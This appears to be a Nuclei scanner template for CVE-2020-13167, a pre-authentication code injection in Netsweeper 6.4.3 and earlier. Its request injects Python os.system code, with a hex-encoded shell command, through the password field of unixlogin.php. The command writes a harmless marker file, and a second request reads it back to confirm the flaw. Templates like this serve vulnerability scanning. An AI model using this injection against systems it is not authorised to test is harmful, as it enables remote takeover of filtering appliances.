id: CVE-2020-13167
info:
  name: Netsweeper <=6.4.3 - Python Code Injection
  author: dwisiswant0
  severity: critical
  description: A vulnerability in Netsweeper version 6.4.3 and earlier allows unauthenticated
    remote code execution through injection of shell metacharacters via webadmin/tools/unixlogin.php
    with certain Referer headers.
  reference:
  - https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/
  - https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says
  - https://nvd.nist.gov/vuln/detail/CVE-2020-13167
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-13167
    cwe-id: CWE-78
  metadata:
    hex-payload: echo "bm9uZXhpc3RlbnQ=" | base64 -d > /usr/local/netsweeper/webadmin/out
    impact: The impact of CVE-2020-13167 on Netsweeper users is the potential for
      unauthenticated remote code execution through shell metacharacter injection.
    recommendation: It is strongly recommended to update to the latest version of
      Netsweeper (version 6.4.4 or higher) to prevent potential exploitation of the
      Python code injection vulnerability identified as CVE-2020-13167.
  tags: cve,cve2020,netsweeper,rce,python,webadmin
requests:
- method: GET
  path:
  - '{{BaseURL}}/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5'
  - '{{BaseURL}}/webadmin/out'
  headers:
    Referer: '{{BaseURL}}/webadmin/admin/service_manager_data.php'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - nonexistent
  - type: status
    status:
    - 200
